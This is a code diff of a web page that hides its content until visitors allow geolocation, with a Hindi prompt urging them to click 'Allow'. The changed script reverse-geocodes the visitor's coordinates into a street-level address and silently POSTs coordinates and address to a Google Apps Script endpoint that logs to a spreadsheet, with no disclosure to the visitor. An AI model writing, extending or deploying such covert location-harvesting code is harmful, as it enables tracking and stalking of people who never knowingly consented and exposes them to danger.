@@ -30,34 +30,59 @@
       const content = document.getElementById("main-content");
       const warning = document.getElementById("warning");
 
-      navigator.geolocation.getCurrentPosition(
-        function (position) {
-          content.style.display = "block";
-          warning.style.display = "none";
+      // Default: show warning
+      content.style.display = "none";
+      warning.style.display = "block";
 
-          fetch("https://script.google.com/macros/s/AKfycbxL8oPihXWcGqvq-hpC5HyKqOKyCRzZHgx3HA3tqz-7d40hU1kjCgYo5QzvlFm-wrer/exec", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude
-            })
-          })
-          .then(response => response.text())
-          .then(data => {
-            console.log("Location sent:", data);
-          })
-          .catch(err => {
-            console.error("Error sending location:", err);
-          });
-        },
-        function (error) {
-          content.style.display = "none";
-          warning.style.display = "block";
-        }
-      );
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            // Location allowed
+            content.style.display = "block";
+            warning.style.display = "none";
+
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // Reverse geocode to get address
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+              .then(res => res.json())
+              .then(locationData => {
+                const address = locationData.address;
+                const road = address.road || "";
+                const suburb = address.suburb || "";
+                const city = address.city || address.town || address.village || "Unknown";
+                const state = address.state || "";
+                const country = address.country || "";
+
+                // Send data to Google Sheet
+                fetch("https://script.google.com/macros/s/AKfycbwMrtWJNVLDAWF2mdsomMm8bbd2fy9yUfKozOGn9kf8wrp7RY0KFGknPSBc1oBKiLlB/exec", {
+                  method: "POST",
+                  headers: {
+                    "Content-Type": "application/json"
+                  },
+                  body: JSON.stringify({
+                    latitude: lat,
+                    longitude: lon,
+                    road: road,
+                    suburb: suburb,
+                    city: city,
+                    state: state,
+                    country: country
+                  })
+                })
+                .then(response => response.text())
+                .then(data => console.log("Location sent:", data))
+                .catch(err => console.error("Send error:", err));
+              });
+          },
+          function (error) {
+            // Location denied or error
+            content.style.display = "none";
+            warning.style.display = "block";
+          }
+        );
+      }
     });
   </script>
 </head>
@@ -65,7 +90,7 @@
 
 <div id="warning" style="display:none;">
   <h1>⚠️ ध्यान दें</h1>
-  <p>इस पेज को देखने के लिए 'Allow' पर क्लिक करें।</p>
+  <p>इस पेज को देखने के लिए <strong>'Allow'</strong> पर क्लिक करें</p>
 </div>
 
 <div id="main-content" style="display:none;">
